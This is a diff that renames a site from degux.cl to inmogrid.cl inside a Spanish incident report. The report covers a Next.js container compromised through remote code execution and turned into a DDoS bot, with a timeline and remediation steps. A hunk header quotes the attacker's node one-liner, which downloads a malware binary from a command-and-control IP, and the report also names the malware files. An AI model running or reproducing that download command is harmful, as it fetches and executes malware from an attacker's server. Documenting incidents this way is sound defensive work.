@@ -1,6 +1,6 @@
-# Reporte de Seguridad: degux.cl Comprometido
+# Reporte de Seguridad: inmogrid.cl Comprometido
 
-**Para**: Equipo degux.cl
+**Para**: Equipo inmogrid.cl
 **Fecha**: 2026-02-07
 **Severidad**: CRITICA
 **Estado**: Contenido - Acciones pendientes
@@ -9,13 +9,13 @@
 
 ## Resumen Ejecutivo
 
-El servidor de produccion de degux.cl fue comprometido y utilizado como parte de un ataque DDoS distribuido. DigitalOcean detecto el trafico malicioso y notifico via Ticket #11599402. La causa raiz es una **vulnerabilidad de ejecucion remota de codigo (RCE) en la aplicacion Next.js** que permite a atacantes ejecutar comandos dentro del contenedor via requests POST al root endpoint.
+El servidor de produccion de inmogrid.cl fue comprometido y utilizado como parte de un ataque DDoS distribuido. DigitalOcean detecto el trafico malicioso y notifico via Ticket #11599402. La causa raiz es una **vulnerabilidad de ejecucion remota de codigo (RCE) en la aplicacion Next.js** que permite a atacantes ejecutar comandos dentro del contenedor via requests POST al root endpoint.
 
 ---
 
 ## Que Paso
 
-1. Un atacante envio requests `POST /` al sitio degux.cl a traves de nginx
+1. Un atacante envio requests `POST /` al sitio inmogrid.cl a traves de nginx
 2. La aplicacion Next.js proceso estos requests y ejecuto codigo malicioso del lado del servidor
 3. El codigo malicioso descargo y ejecuto un bot DDoS (`udevr`) y otros binarios
 4. El bot consumio 80% CPU y 1.9GB RAM enviando 36,782 paquetes/segundo a victimas
@@ -42,17 +42,17 @@ node -e require('http').get('http://91.92.243.113:235/x86_64.kok',
 
 ---
 
-## Impacto en degux.cl
+## Impacto en inmogrid.cl
 
 ### Disponibilidad
-- degux.cl estuvo operativo durante el ataque (el malware corria en segundo plano)
+- inmogrid.cl estuvo operativo durante el ataque (el malware corria en segundo plano)
 - Actualmente: operativo pero con exploit activo siendo bloqueado por read-only filesystem
 - Performance degradada durante el ataque (80% CPU consumido por malware)
 
 ### Datos
-- **Base de datos NO comprometida**: degux-db esta en red aislada, sin acceso directo
+- **Base de datos NO comprometida**: inmogrid-db esta en red aislada, sin acceso directo
 - **Credenciales potencialmente expuestas**: el atacante tuvo acceso al entorno del contenedor que incluye:
-  - PostgreSQL password (degux_user)
+  - PostgreSQL password (inmogrid_user)
   - NextAuth secret
   - Google OAuth client secret
   - Google Maps API key
@@ -70,11 +70,11 @@ node -e require('http').get('http://91.92.243.113:235/x86_64.kok',
 
 ### Problema Identificado
 
-La aplicacion Next.js de degux.cl tiene una vulnerabilidad de **Server-Side Code Execution** que permite a atacantes ejecutar codigo arbitrario en el servidor mediante requests POST al endpoint root (`/`).
+La aplicacion Next.js de inmogrid.cl tiene una vulnerabilidad de **Server-Side Code Execution** que permite a atacantes ejecutar codigo arbitrario en el servidor mediante requests POST al endpoint root (`/`).
 
 Los errores `ReferenceError: returnNaN is not defined` en los logs indican que el payload del atacante esta siendo evaluado en el contexto del servidor Node.js.
 
-### Acciones Requeridas del Equipo degux.cl
+### Acciones Requeridas del Equipo inmogrid.cl
 
 1. **CRITICO: Investigar y parchear la vulnerabilidad RCE en Next.js**
    - Verificar la version de Next.js y buscar CVEs conocidos
@@ -90,14 +90,14 @@ Los errores `ReferenceError: returnNaN is not defined` en los logs indican que e
    - Implementar rate limiting en rutas publicas
 
 3. **ALTA: Rotar credenciales**
-   - Generar nueva DEGUX_DB_PASSWORD y actualizar en degux-db
-   - Generar nuevo DEGUX_NEXTAUTH_SECRET
+   - Generar nueva INMOGRID_DB_PASSWORD y actualizar en inmogrid-db
+   - Generar nuevo INMOGRID_NEXTAUTH_SECRET
    - Revocar y recrear Google OAuth Client Secret en Google Console
-   - Restringir Google Maps API Key solo a dominios degux.cl
+   - Restringir Google Maps API Key solo a dominios inmogrid.cl
    - Rotar N8N_WEBHOOK_SECRET
 
 4. **MEDIA: Auditar dependencias npm**
-   - Ejecutar `npm audit` en el proyecto degux.cl
+   - Ejecutar `npm audit` en el proyecto inmogrid.cl
    - Verificar que no hay paquetes comprometidos en la cadena de suministro
    - Actualizar todas las dependencias con vulnerabilidades conocidas
 
@@ -153,18 +153,18 @@ sudo usermod -aG adm gabriel
 
 | Hora (UTC) | Evento |
 |------------|--------|
-| ~Feb 06 | Compromiso inicial del contenedor degux-web |
+| ~Feb 06 | Compromiso inicial del contenedor inmogrid-web |
 | Feb 06 18:22 CL | DigitalOcean envia notificacion |
 | Feb 07 02:37 | Investigacion forense iniciada |
 | Feb 07 02:37 | Malware identificado: udevr (80% CPU), x86_64.kok, .monitor |
-| Feb 07 02:40 | Contenedor degux-web detenido - DDoS contenido |
+| Feb 07 02:40 | Contenedor inmogrid-web detenido - DDoS contenido |
 | Feb 07 02:55 | Puertos asegurados (127.0.0.1), security_opt aplicado |
 | Feb 07 03:05 | Imagen reconstruida desde cero (--no-cache) |
-| Feb 07 03:07 | degux-web re-iniciado con hardening |
+| Feb 07 03:07 | inmogrid-web re-iniciado con hardening |
 | Feb 07 03:10 | RE-INFECCION detectada (malware reinstalado en 5 min) |
 | Feb 07 03:11 | Contenedor detenido nuevamente |
 | Feb 07 03:12 | read_only filesystem + tmpfs noexec aplicado |
-| Feb 07 03:13 | degux-web re-iniciado con filesystem read-only |
+| Feb 07 03:13 | inmogrid-web re-iniciado con filesystem read-only |
 | Feb 07 03:14 | Exploit capturado en vivo: POST / -> node download -> writeFileSync FALLA |
 | Feb 07 03:14 | **ATAQUE NEUTRALIZADO**: CPU 0.09%, malware no puede escribirse |
 | Feb 07 03:14 | Tercer C2 IP descubierto: 91.92.243.113:235 |
